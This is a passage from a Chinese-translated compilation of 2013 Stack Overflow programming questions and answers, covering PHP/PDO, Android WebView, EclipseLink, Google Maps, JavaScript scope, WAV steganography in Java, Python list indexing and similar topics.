[http://msdn.microsoft.com/en-us/library/bb404713%28v=vs.95%29.aspx](http://msdn.microsoft.com/en-us/library/bb404713%28v=vs.95%29.aspx)

![在此处输入图像描述](https://i.stack.imgur.com/wpKKd.png)

但是，它包含服务客户端类 - 因此您可以使用 WCF（和 WCF RIA 服务）从远程服务器获取数据。

这种方法也很有意义——你的 Silverlight 应用程序最终将在**客户端**PC 上运行，通常在浏览器中运行——你真的不希望地球上任何地方的成百上千的客户端 PC 直接访问你的SQL 服务器数据库。以这种方式，通过服务引导这些数据请求很有意义。

这与 ASP.NET 不同，在 ASP.NET 中，您的代码通常在后端服务器基础架构上运行，因此它更“接近”您的数据库服务器并且可以直接调用 SQL Server - 然后它只是将 HTML 返回给调用者（客户端的电脑和浏览器）。

我发现这篇文章在这里非常有用和有启发性：

*   [Silverlight 入门 - 第 3 部分 - 访问数据](http://timheuer.com/blog/articles/silverlight-get-started-part-3-accessing-data.aspx)

# php - fetchAll 函数中表名的占位符变量

> ID：15847763
> 
> 赞同：2
> 
> 时间：2013-04-06T06:21:30.780
> 
> 标签：php, mysql, sql

我有一个`PHP`使用 SELECT`SQL`查询的函数。我在这样的查询中使用占位符变量（？）。（此占位符用于 mysql 数据库中的表名）：

```
protected function _fetchPreviousShiftData($table, $report_time)
{

$query = "SELECT * FROM ? WHERE report_date=? and shift=?";
$previousShiftData = $this->_getDbConnection()->fetchAll($query,array($table, date("Y-m-d"), $this->_shiftValue($report_time, 8)));

return $previousShiftData;
} 
```

但是我在 $table 变量中有一个错误，我应该如何使用“？” 对于 $table 变量？错误是这样的：

```
PHP Fatal error:  Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''adsl_support' WHERE report_date='2013-04-06' and shift='18-2'' at line 1' in C:\php_shared_lib\Zend\Db\Statement\Pdo.php:228 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:28:56.213

您不能将其用于表名或字段名...仅用于传递的值...

您可以列出可能的表名，检查它并使用

```
"SELECT FROM `$table`..." 
```

如果检查通过

# android - cron - 如何在特定时间在模拟器中自动调用/启动 Android 应用程序？

> ID：15847767
> 
> 赞同：0
> 
> 时间：2013-04-06T06:22:07.010
> 
> 标签：android, android-emulator, cron, crontab

这是问题所在：我在 Android 模拟器上安装了一个应用程序，我想在某个特定时间调用/启动该应用程序。有没有简单的方法（比如 cron 工作或类似的东西）来做到这一点？

谢谢！

# java - 限制打开网络驱动器

> ID：15847771
> 
> 赞同：0
> 
> 时间：2013-04-06T06:22:18.207
> 
> 标签：java, database, swing, ms-access, network-drive

伙计们，我有基于 java-swing 的项目。它基本上就像通过 Intranet 进行的信息共享，用户通过无线/有线方式相互连接。数据库位于网络驱动器上。所有机器都安装了该应用程序。每个人都可以执行数据库。我有以下问题：

* * *

1.  每个人都可以查看网络驱动器中的文件夹（包括数据库）。如何设置权限以使应用程序能够访问数据库但用户无法查看网络驱动器文件夹。

2.  如果有人尝试同时执行数据库，则会引发 SQL 错误。如何处理？当这种异常被捕获时，我应该延迟一些吗？

PS-我正在使用 Ms Access

需要紧急帮助..提前谢谢大家..会很有帮助...！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T18:22:31.323

> 每个人都可以查看网络驱动器中的文件夹（包括数据库）。如何设置权限以使应用程序能够访问数据库但用户无法查看网络驱动器文件夹。

如果人们要访问网络驱动器上的共享 .accdb 或 .mdb 文件，那么显然他们必须能够“看到”并“读取”它。如果他们需要能够更新该数据库，那么他们也需要对该文件的“写入”权限。

另请注意，要使共享 Jet/ACE 数据库文件的多用户访问正常工作，*所有*用户都必须具有共享文件所在**文件夹**`Create File`的权限。这是因为他们需要能够在该文件夹中创建锁定文件（.laccdb 或 .ldb）。（有关更详细的解释，请参阅我的其他答案[。](https://stackoverflow.com/questions/15239970/how-to-enable-1-user-to-update-the-database-while-allowing-others-to-only-read-i/15735367#15735367)）

 **至于限制对网络共享上所有其他文件和文件夹的访问，那就是*在服务器*上对这些对象设置适当的权限。如果他们可以打开资源管理器窗口并以这种方式浏览网络共享，那么摆弄您的应用程序代码以尝试限制访问是没有意义的。

> 如果有人尝试同时执行数据库，则会引发 SQL 错误。如何处理？

请编辑您的问题，让我们知道错误的*实际*含义。**

# javascript - 弹出窗口的大小与其内容不匹配

> ID：15847776
> 
> 赞同：0
> 
> 时间：2013-04-06T06:22:45.480
> 
> 标签：javascript, html, css, google-chrome, google-chrome-extension

在我为 Chrome 制作的扩展中，我将弹出窗口的宽度和高度定义为`600 x 300 px`. 在 Chrome 最近更新到 Chrome 27 之前，它工作得非常好。

![在此处输入图像描述](https://i.stack.imgur.com/Deh0c.png)

从上面的截图可以看出，我已经通过 CSS 设置了宽度和高度，但是在弹出的底部仍然显示了 30 px 的间隙。这令人沮丧，因为无论我尝试什么，差距仍然存在。页面外没有任何东西浮动，我也设置`body`为`overflow: hidden`.

```
window.resize( /* */ );  //won't do anything different 
```

那么我怎样才能使其大小精确`600 x 300`（在 Chrome 27 中）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T20:39:26.630

`background-size:100% 100%;`尝试对具有该背景的父元素使用 background-size 属性。

# c++ - 在 C++ 套接字编程中通过代理服务器连接到服务器时出错

> ID：15847781
> 
> 赞同：0
> 
> 时间：2013-04-06T06:23:00.073
> 
> 标签：c++, sockets, proxy, connection

连接代码：

```
 cout << "connecting1\n";
    WSADATA wsadata;
    int iResult = WSAStartup (MAKEWORD(2,2), &wsadata );
    if (iResult !=NO_ERROR )
        printf("\nmyERROR at WSAStartup()\n");
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("error opening socket"); return -1;
    }
    struct sockaddr_in sin;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(host.c_str());
    sin.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
        perror("error connecting to host"); return -1;
    }
    const int query_len = query.length() + 1; // trailing '\0'
    if (send(sock, query.c_str(), query_len, 0) != query_len) {
        perror("error sending query"); return -1;
    }

    const int buf_size = 1024 * 1024;
    while (true) {
        std::vector<char> buf(buf_size, '\0');
        const int recv_len = recv(sock, &buf[0], buf_size - 1, 0);

        if (recv_len == -1) {
            perror("error receiving response"); return -1;
        } else if (recv_len == 0) {
            std::cout << std::endl; break;
        } else {
            std::cout << &buf[0];           
            fprintf(fp, "%s", &buf[0]);
        }
    } 
```

在没有代理的wifi中它工作正常，但是当我们使用代理服务器时，可以在chrome中访问网络，但是上面的代码打印

```
connecting1

error connecting to host 
```

问题是什么 ？

# backbone.js - 如何在dust.js部分访问模型属性

> ID：15847785
> 
> 赞同：1
> 
> 时间：2013-04-06T06:23:33.150
> 
> 标签：backbone.js, dust.js

我想知道如何访问灰尘部分 {#} {/} 内的数组模型属性。

```
MODEL:

"a":new array();

"b":{
 "c":new array();
}

DUST TEMPLATE:

{#a}
 want to access {c} here...
{/a} 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T07:27:21.153

`{#c}`当你在里面时访问`{#a}`。首先你需要上去`{#b}`然后在里面你需要下到`c`{#a}。

所以你需要这样的东西：

```
{#a}
    {name}
    {#b}        
      {#c}
         {name}
      {/c}
    {/b}        
{/a} 
```

演示[JSFiddle](http://jsfiddle.net/WUwLx/)。

# java - 音频速记

> ID：15847787
> 
> 赞同：5
> 
> 时间：2013-04-06T06:23:39.867
> 
> 标签：java

我正在做我最后一年的 JAVA 项目

1）在图像中隐藏文本

2）图像中的图像

3）音频文件中的文本（WAVE）

我已成功完成 1) 和 2) 并已附上源代码（如果有人可能需要）。我在第三个问题中遇到了麻烦，即在音频文件中隐藏数据。我从波形文件中创建了一个音频输入流并将其数据读入一个字节数组，但很多事情都不清楚，在阅读时我猜第一个 44 个字节是标题字节？（因为文件是 WAVE 格式）或标题根本不被复制。问题是....在再次解码时，我必须从字节数组中新创建的音频文件中读取数据。而且我无法找到隐藏数据的字节。

**谁能告诉我当我们从 audioinputstream 将数据读入字节数组时究竟会发生什么，我的意思是实际读入字节数组的内容是什么？**

```
File fileIn = new File("C:\\Users\\Rahul\\Desktop\\pro\\Don't Stay.wav");

AudioInputStream audioInputStream =

AudioSystem.getAudioInputStream(fileIn);

int avail= audioInputStream.available();

System.out.println("bytes available " +avail);

System.out.println(audioInputStream.markSupported());

int bytesPerFrame =

        audioInputStream.getFormat().getFrameSize();

      // Set an arbitrary buffer size of 1024 frames.

int numBytes = 1024 * bytesPerFrame;

byte[] audioBytes = new byte[numBytes];

audioInputStream.read(audioBytes);

byte btext[]=Stego_text("good morning!");

byte bcoded[]=steg.encoding(audioBytes,btext,0);

 byte[] stg= a.decode_text(audioBytes);

 String obtain= new String(stg);

        System.out.println(">>>"+ obtain); //the hidden message gets successfully displayed here

try {

   //

            AudioSystem.write(audioInputStream, Type.WAVE, new File("C:\\Users\\Rahul\\Desktop\\pro\\Don't Stay_restored.wav"));

        } catch (Exception e) {

            e.printStackTrace();

        }

        byte[] audioBytesNew = new byte[numBytes];

        audioInputStream.read(audioBytesNew);

        byte[] stg1= a.decode_text(audioBytesNew);

        String obtain1= new String(stg1);

        System.out.println(">>>"+ obtain1); //the hidden message does not get displayed 
```

如果我在编辑后解码字节数组，那么它可以正常工作并显示隐藏的消息，但是在再次创建一个字节数组并读入它的 audioinputsream 数据然后解码该字节数组之后......它不起作用。我想知道为什么？请帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T17:54:31.293

前 44 个字节确实是 WAV 的标头（请参阅[https://ccrma.stanford.edu/courses/422/projects/WaveFormat/](https://ccrma.stanford.edu/courses/422/projects/WaveFormat/)）

如果您在 HEX 编辑器中打开文件，您会看到它的样子 ( [http://imgur.com/iliA40R](http://imgur.com/iliA40R) )

如果你比较文件中的数据和你的 InputStream 读取的数据，它匹配。

如果您需要再次读取文件，您应该关闭并重新打开您的流。如果你可以标记文件，你可以在读取之前标记它，并在第一次读取完成后调用 reset()。

# javascript - 根据复选框选择显示随机文本（javascript）

> ID：15847788
> 
> 赞同：1
> 
> 时间：2013-04-06T06:23:40.027
> 
> 标签：javascript, input

我正在掌握 Javascript，需要执行以下操作：

有四个带有“红、蓝、黄、绿”文本的复选框。当用户单击按钮时，其中一种颜色将随机显示为文本。

有什么建议如何用 Javascript 做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:53:45.053

我相信这就是你想要做的：

`[http://jsfiddle.net/DerekL/QgGwS/](http://jsfiddle.net/DerekL/QgGwS/)`

^*我在这里使用[jQuery](http://www.jquery.com/)只是为了解释。如果您愿意，可以将其转换为纯 JavaScript。

```
$("button").click(function(){
    $colors = $("input:checked");       //Get all the checkboxes that are checked
    if( $colors.length != 0){           //At least 1 checkbox has to be checked
        var index = Math.floor(Math.random()*$colors.length); //generate ran. num
        $("span").html($colors[index].value);                 //show the value
    }else{
        alert("Choose a color!");       //Tell the user to check at least 1 box
    }    
}); 
```

> 当您单击按钮时，将显示从复选框列表中随机选择的一种颜色。

# android - AndroidDriver 上 Selenium Webdriver 的 FindElement 问题

> ID：15847791
> 
> 赞同：1
> 
> 时间：2013-04-06T06:23:52.263
> 
> 标签：android, selenium, webdriver

这个问题可能看起来类似于[Having Difficulty in find Elements](https://stackoverflow.com/questions/15780616/having-difficulty-in-finding-elements-using-xpath-and-css-in-selenium-android-we/15813240#15813240)，但在我的情况下，测试在firefox 等桌面浏览器上运行良好，即驱动程序，但是当来到Android 驱动程序时，它无法在模拟器webdriver 中找到元素。

注意：网页启动成功，即使返回页面标题名称。

# eclipselink - 有没有办法在 EclipseLink 中禁用 @AdditionalCriteria？

> ID：15847792
> 
> 赞同：7
> 
> 时间：2013-04-06T06:23:53.370
> 
> 标签：eclipselink

在 EclipseLink 中使用 @AdditionalCriteria 很容易，例如过滤掉软删除的实体，但是在执行特定查询之前有什么方法可以暂时禁用它？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-11T10:42:55.660

是的，这是可能的，有一个简单的解决方法。我像这样指定了@AdditionalCriteria 注释：

```
@AdditionalCriteria(":disableDeletedFeature = 1 or this.isDeleted = false") 
```

并为 persistence.xml 中的禁用标志指定了默认属性值：

```
<property name="disableDeletedFeature" value="0"/> 
```

因此默认情况下启用过滤，但您可以在 EntityManager 级别轻松禁用它，如下所示：

```
entityManager.setProperty("disableDeletedFeature", 1); 
```

对我来说一切正常，希望对我有帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T14:18:10.367

如果您使用本机 SQL 查询，则不会附加条件。

否则，没有简单的方法来禁用它被附加，除非您创建另一个持久性单元或另一个没有附加条件的类。

您可以做的一件事是在基于会话属性的条件中放置一个 OR 条件，然后当您将此属性设置为 true 时，您可以禁用该条件。

您可以记录增强请求以添加不将其附加到查询的选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-19T11:00:44.490

我使用eclipselink 2.4.1。它仅与引号一起用于属性值：

```
@AdditionalCriteria(":disableDeletedFeature = '1' or this.isDeleted = false") 
```

和这里：

```
entityManager.setProperty("disableDeletedFeature", '1'); 
```

# javascript - 收到错误对象不支持 CRM 2011 中 Web 资源中的属性或方法“setSrc”

> ID：15847796
> 
> 赞同：2
> 
> 时间：2013-04-06T06:24:22.217
> 
> 标签：javascript, dynamics-crm-2011, dynamics-crm, crm, onload

我在页面上使用了 WebResource，但我收到一个错误 Object does not support property or method 'setSrc' in Javascript

你能帮我么

我的实际代码是这样的

```
function getImage()
{
var entityId = Xrm.Page.data.entity.getId();
var profilePictureElement = Xrm.Page.getControl("WebResource_ProfilePicture");
if (entityId) {
    var oDataQuery = getServerUrl() + "/XRMServices/2011/OrganizationData.svc" +
        "/AnnotationSet?$top=1&$select=AnnotationId,DocumentBody,MimeType&" +
        "$orderby=ModifiedOn desc&$filter=ObjectId/Id eq guid'" + entityId +
        "' and IsDocument eq true and Subject eq 'Profile Picture'" +
        " and startswith(MimeType,'image/') ";

    $.ajax({
        type: "GET",
        contentType: "application/json; charset=utf-8",
        datatype: "json",
        url: oDataQuery,
        beforeSend: function (request) { request.setRequestHeader("Accept", "application/json"); },
        success: function (data, textStatus, request) {
            if (data.d.results.length > 0) {
                var mimeType = data.d.results[0].MimeType;
                var body = data.d.results[0].DocumentBody;
                // set src attribute of default profile picture web resource.
                // here we use DataURI schema which has 32kb limit in IE8 and doesn't support IE <= 7.
                profilePictureElement.setSrc("data:" + mimeType + ";base64," + body);

            }
        },
        error: function (request, status, exception) { }
    });
  }
}
function getServerUrl()
{
var serverUrl = Xrm.Page.context.getServerUrl();
// trim trailing forward slash in url
return serverUrl.replace(/\/*$/, "");
} 
```

您可以从这里参考整篇文章[http://blogs.msdn.com/b/crm/archive/2011/09/28/displaying-a-contact-s-facebook-picture-in-microsoft-dynamics-crm- 2011.aspx?CommentPosted=true#commentmessage](http://blogs.msdn.com/b/crm/archive/2011/09/28/displaying-a-contact-s-facebook-picture-in-microsoft-dynamics-crm-2011.aspx?CommentPosted=true#commentmessage)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T13:24:02.863

现在看起来像这样的方法`getSrc`，并且`setSrc`只有在引用 HTML 内容时才能用于 Web 资源。

如果 Web 资源是图像，则 crm 将使用`img`标记来显示图片。

如果要使该代码正常工作，则需要检索`img`元素并`src`手动分配属性：

代替

```
profilePictureElement.setSrc("data:" + mimeType + ";base64," + body); 
```

你需要写

```
var profilePicture = document.getElementById("WebResource_ProfilePicture");
profilePicture.setAttribute("src","data:" + mimeType + ";base64," + body); 
```

注意：**这是不受支持的自定义**

# android - 如何在 android 应用程序中使用 webview 作为浏览器？

> ID：15847798
> 
> 赞同：0
> 
> 时间：2013-04-06T06:24:28.297
> 
> 标签：android, webview

[网址在这里](http://www.allrecipes.com)

当我在我的应用程序 webview 中加载上述 url 时，它更改为[http://m.allrecipes.com](http://m.allrecipes.com)但是当我在浏览器中加载相同的 url 时，它的 url 为[http://allrecipes.com](http://allrecipes.com)。

有什么方法可以在我的应用程序 webview 中加载普通 url（[http://allrecipes.com](http://allrecipes.com)）而不加载移动页面（[http://m.allrecipes.com](http://m.allrecipes.com)）

任何人都知道请帮助我

```
go.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                if (Searchtext.getText().toString().equalsIgnoreCase("")) {

                    alertDialog = new AlertDialog.Builder(OnlineRecipe.this)
                            .create();
                    alertDialog.setTitle("Message");
                    alertDialog.setMessage("Please Enter Some Word");

                    alertDialog.setButton("OK",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog,
                                        int which) {
                                    // Write your code here to execute after
                                    // dialog closed
                                    alertDialog.dismiss();
                                }
                            });

                    // Showing Alert Message
                    alertDialog.show();
                } else {

                    String url = "http://allrecipes.com/search/default.aspx?qt=k&wt="
                            + Searchtext.getText().toString()
                            + "&rt=r&origin=Recipe Search Results";
                    webview.getSettings().setJavaScriptEnabled(true);
                    webview.loadUrl(url);

                }

            }
        }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T20:18:39.133

如果我理解正确，您要做的就是以桌面模式在您的 WebView 中加载[http://allrecipes.com](http://allrecipes.com) ......如果是这种情况，请使用以下代码使其工作：

```
webview.getSettings().setUserAgentString("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/20 Safari/537.31"); 
```

这只需要在您创建 WebView 对象 webview 的部分之后放置在您的代码中。

编辑：只是为了让您知道以供将来参考，这行代码更改了用户代理，以欺骗网站认为您是从计算机而不是手机访问它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:35:07.500

不要记得在您的 AndroidManifest.xml 中添加活动

例子 ：

```
 <activity android:name=".Second"
              android:label="@string/app_name"
              android:theme="@android:style/Theme.NoTitleBar"
              android:configChanges="orientation|keyboardHidden">
    </activity> 
```

班级 ：

```
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class Second extends Activity {

    WebView webView;

    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        webView = (WebView)findViewById(R.id.webview);

        webView.getSettings().setJavaScriptEnabled(true);

        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        webView.setWebViewClient(new WebClient());

        webView.loadUrl(getIntent().getExtras().getString("url"));

    }

    public class WebClient extends WebViewClient
    {
        ProgressDialog pd; // Create Proggress Dialog to show if User Internet connection is slow

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url)
        {
            Intent i = new Intent(Second.this, Second.class);
            i.putExtra("url", url);
            startActivity(i);

            return true;
        }

        public void onPageStarted(WebView view, String url, Bitmap favicon)
        {
            pd = ProgressDialog.show(Second.this, "",getString(R.string.loading), true);
            pd.setCancelable(true);
        }

        public void onPageFinished(WebView view, String url)
        {
            if (pd.isShowing()) {
                pd.dismiss();
            }
        }
    }
} 
```

# javascript - 程式化的谷歌地图不会出现？

> ID：15847802
> 
> 赞同：1
> 
> 时间：2013-04-06T06:24:48.330
> 
> 标签：javascript, maps

我是这个论坛的新手，目前对这个风格化的谷歌地图有疑问。它没有按应有的方式出现。

```
<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=MY_OWN_KEY&sensor=false"></script> 
<script type="text/javascript">
    function initialize() {

        // Create an array of styles.
        var styleArray = [
            {
                "featureType": "water",
                "stylers": [
                  { "saturation": -100 },
                  { "lightness": -32 }
                ]
            },{
                "featureType": "road",
                "stylers": [
                  { "saturation": -100 }
                ]
            },{
                "featureType": "landscape.natural.landcover",
                "stylers": [
                  { "saturation": -100 },
                  { "lightness": 63 }
                ]
            },{
                "featureType": "poi",
                "stylers": [
                  { "lightness": 4 },
                  { "saturation": -100 }
                ]
            }
        ]

        // Create a new StyledMapType object, passing it the array of styles,
        // as well as the name to be displayed on the map type control.
        var styledMap = new google.maps.StyledMapType(styles,
            {name: "Styled Map"});

        // Create a map object, and include the MapTypeId to add
        // to the map type control.
        var mapOptions = {
            zoom: 17,
            center: new google.maps.LatLng(-34.397, 150.644),
            mapTypeControlOptions: {
                mapTypeIds: [google.maps.MapTypeId.ROADMAP, 'map_style']
            }
        };

        var map = new google.maps.Map(document.getElementById('map'),
            mapOptions);

        //Associate the styled map with the MapTypeId and set it to display.
        map.mapTypes.set('map_style', styledMap);
        map.setMapTypeId('map_style');
    }
</script> 
```

HTML如下：

```
<div id="map" style="width: 100%; height: 500px"></div> 
```

希望这里的大师可以帮助我。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T09:22:16.217

你这里有两个错误。

您没有`initialize()`在任何地方调用，因此您的 JavaScript 代码都不会运行。在脚本末尾添加这一行：

```
google.maps.event.addDomListener( window, 'load', initialize ); 
```

修复该问题后，在打开开发人员工具的情况下加载页面，您将看到一个`styles`未定义的错误，因为您将数组命名为`styleArray`。更改一个或另一个以匹配，您的地图将加载！

# java - 在 LIBGDX 中生成可执行 Jar 文件

> ID：15847805
> 
> 赞同：2
> 
> 时间：2013-04-06T06:25:04.253
> 
> 标签：java, jar, libgdx

需要明确的是，我知道在 stackoverflow 上有一个这样的线程，而我使用 Intellij 时他使用 eclipse。在 eclipse 和 intellij 中创建可执行 jar 是不同的。因此，在投票之前请考虑我的情况。我使用 libgdx 创建了一个简单的 java 游戏，并希望将其导出到可执行 jar 中。但在此之前，我尝试在官方LIBGDX的教程视频中创建一个jar。这是jar文件Dload it [here](http://www.mediafire.com/download.php?sc80op66ddpcmd6) ..如果你执行它打开然后再次关闭。但是当我在 intellij 中运行项目时，它运行时没有错误。

如果我执行我创建的 jar 文件，这是我所期待的图像.. ![在此处输入图像描述](https://i.stack.imgur.com/0G9gu.png)

当我尝试创建一个 jar 文件时出了什么问题？任何人？？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T18:50:29.487

Just open your exported jar file like a zip archive and export your assets folder and libraries beside your jar file then test it again. Hope this helps.

# oop - OOP 设计模式中的“客户端”概念？

> ID：15847806
> 
> 赞同：8
> 
> 时间：2013-04-06T06:25:06.533
> 
> 标签：oop, design-patterns, client, concept

我阅读了许多有关 GoF 的 OOP 设计模式的主题，但我不确定“客户端”概念。那是什么？我们如何在我们的应用程序中实现它。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T07:24:07.970

在 gof 书中，客户端是使用模式中的类的代码或类。

例如，来自动机下的抽象工厂模式：

![与客户的关系图](https://i.stack.imgur.com/YvGr4.gif)

考虑一个支持多种外观标准的用户界面工具包，例如 Motif 和 Presentation Manager。不同的外观为用户界面“小部件”（如滚动条、窗口和按钮）定义了不同的外观和行为。为了跨外观标准可移植，应用程序不应硬编码其小部件以获得特定外观。在整个应用程序中实例化特定于外观的小部件类使得以后很难更改外观。

我们可以通过定义一个抽象的 WidgetFactory 类来解决这个问题，该类声明一个用于创建每种基本类型的小部件的接口。每种小部件还有一个抽象类，具体的子类实现特定外观标准的小部件。WidgetFactory 的接口有一个操作，它为每个抽象小部件类返回一个新的小部件对象。客户端调用这些操作来获取小部件实例，但客户端不知道他们正在使用的具体类。因此，客户保持独立于流行的外观和感觉。

每个外观标准都有一个具体的 WidgetFactory 子类。每个子类都实现了为外观创建适当小部件的操作。例如，MotifWidgetFactory 上的 CreateScrollBar 操作实例化并返回一个 Motif 滚动条，而 PMWidgetFactory 上的相应操作则为 Presentation Manager 返回一个滚动条。客户端仅通过 WidgetFactory 接口创建小部件，并且不知道实现特定外观的小部件的类。换句话说，客户端只需提交由抽象类定义的接口，而不是特定的具体类。

WidgetFactory 还强制具体的小部件类之间的依赖关系。Motif 滚动条应该与 Motif 按钮和 Motif 文本编辑器一起使用，并且由于使用 MotifWidgetFactory，该约束会自动强制执行。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T06:32:11.833

作为一种模式，客户端是发起与*服务器*交互的参与者，服务器是功能性的，但通常是被动的参与者。*如请求*所描述的那样，服务器代表客户端执行某些操作并以*响应*的形式返回报告。

因此，客户端接口的目的是使任意代码可以方便地或可能地制定请求并吸引服务器的注意。由于请求消息可能通过多种媒体（例如不同的内存空间）传送，因此通常涉及某种透明传输，隐藏在此请求接口后面。

这几乎是它作为一个概念的长短。非常灵活的模式（当然适用于客户端/服务器）的缺点之一是需要深入到一个特定的示例、框架或库来具体说明。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-07T11:46:16.523

客户端只是另一个模块或类，形成系统使用具体模式（全部或部分组件构建模式）

# javascript - 如何解决 Javascript 范围问题。关闭是答案吗？

> ID：15847807
> 
> 赞同：-1
> 
> 时间：2013-04-06T06:25:15.870
> 
> 标签：javascript, jquery, function, google-maps, closures

我有一个功能

```
function getCustomAddress() {
    alert(results[i].formatted_address)
} 
```

`alert(results[i].formatted_address)`在另一个函数中定义。这显然意味着它在 getCustomAddress 中未定义，那么我该如何解决这个问题并提醒这些值。我也设置了一个小提琴。

[http://jsfiddle.net/KEdrq/5/](http://jsfiddle.net/KEdrq/5/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:38:37.470

您可以使用函数创建私有范围并在那里定义所有全局变量：

```
(function(){
 var results = [];
 function getCustomerAdress(){
 //... call result etс
 }

 function set result(){
 //... set result etc
 }

 // some code for initialization, setting onload handlers etc
})(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:33:06.040

您可以将其作为函数参数传递

```
function getCustomAddress(result) {
    alert(result.formatted_address)
} 
```

因此，当您调用该函数时，您需要提供一个参数：getCustomAddress(results[i]); 例如

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T06:53:34.977

我检查了 jsFiddle，结果是作为 ajax 请求获取的。您需要将结果存储在具有全局范围的变量中，然后设置超时以获取结果。您还可以在地理编码器请求结束之前执行您的函数并将其传递给结果变量。

```
geocoder.geocode(geocoderRequest, function (results, status) { 
  // execute your function here. getCustomAddress(result)
} 
```

检查我所做的更改。 [http://jsfiddle.net/KEdrq/7/](http://jsfiddle.net/KEdrq/7/)

代码更改摘要。

```
 var _results;

 function initialize() {
.
.
.
     google.maps.event.addListener(marker, 'dragend', function (e) {

         getAddress(e.latLng);
         setTimeout('getCustomAddress(0);', 500);
     })

     function getAddress(latLng) {
         if (!geocoder) {
             geocoder = new google.maps.Geocoder();
         }
         var geocoderRequest = {
             latLng: latLng
         }
         geocoder.geocode(geocoderRequest, function (results, status) {
             _results = results;
.
.
.

 function getCustomAddress(i) {
     alert(_results[i].formatted_address)
 } 
```

您可能希望创建一个 for 循环来提醒所有结果，而不是在 getCustomAddress 函数中传递结果 id。

# python - Python：查找与给定子列表匹配的列表索引

> ID：15847809
> 
> 赞同：3
> 
> 时间：2013-04-06T06:25:38.240
> 
> 标签：python, list, indexing

假设有两个 Python 列表：

```
my_list = ['a', 'bb', 'c', 'bb', 'cc', 'bbc']
sublist = ['bb', 'bb', 'bbc'] 
```

显然，*子列表*由 *my_list* 的第 1、第 3 和第 5 个元素组成。现在我想得到 index `[1, 3, 5]`，给定这两个列表。有什么简单的方法可以做到这一点吗？

注意：

1.  列表可以具有相同的元素。
2.  子列表维护原始列表中元素的顺序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:39:06.847

您可以使用生成器：

```
def indices(lst, items):
    last_index = 0

    for item in items:
        last_index += lst.index(item, last_index + 1) + 1

        yield last_index 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T06:33:47.830

@Blender 的方法非常适合列表（这是所有这些问题所需要的），这种方法更适用于所有可迭代对象

```
>>> def indices(a, b): # find indices of items from b inside a
        enumerate_a = enumerate(a)
        for x in b:
            for i, y in enumerate_a:
                if x == y:
                    yield i
                    break

>>> list(indices(['a', 'bb', 'c', 'bb', 'cc', 'bbc'], ['bb', 'bb', 'bbc']))
[1, 3, 5] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:43:00.563

```
def get_indices(lst, sublist):
    result = []
    i = 0
    for x in sublist:
        result.append(lst.index(x, i))
        i = result[-1] + 1
    return result 
```

例子：

```
>>> get_indices(['a', 'bb', 'c', 'bb', 'cc', 'bbc'], ['bb', 'bb', 'bbc'])
[1, 3, 5]
>>> get_indices(['a', 'bb', 'c', 'bb', 'cc', 'bbc'], ['c', 'bb', 'bbc'])
[2, 3, 5] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T07:04:25.250

我的解决方案

```
def getIndex(list, sublist):
    index = []
    j = 0;
    for i in range(len(list)):
        if(sublist[j] == list[i]):
            index.append(i)
            j += 1

    return index 
```

它的工作原理是什么？

```
$ python -i p.py 
>>> getIndex(['bb', 'aa', 'bb'], ['aa', 'bb'])
[1, 2]
>>> getIndex(['a', 'bb', 'c', 'bb', 'cc', 'bbc'], ['bb', 'bb', 'bbc'])
[1, 3, 5]
>>> getIndex(['a', 'bb', 'c','bbc', 'bb', 'cc', 'bbc'], ['bb', 'bb', 'bbc'])
[1, 4, 6] 
```

[如果我仍然错了，请有人告诉我。]

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-06T08:53:57.010

我最喜欢**Blender**的回答。但我认为 index() 函数没有参数“start”，所以我在下面进行了一些修改。

```
idx = 0
start = 0
for i in sublist:
    idx = my_list[start:].index(i) + start
    start = idx + 1
    yield idx 
```

# ios - 在 iOS 中独家访问 AudioUnit

> ID：15847811
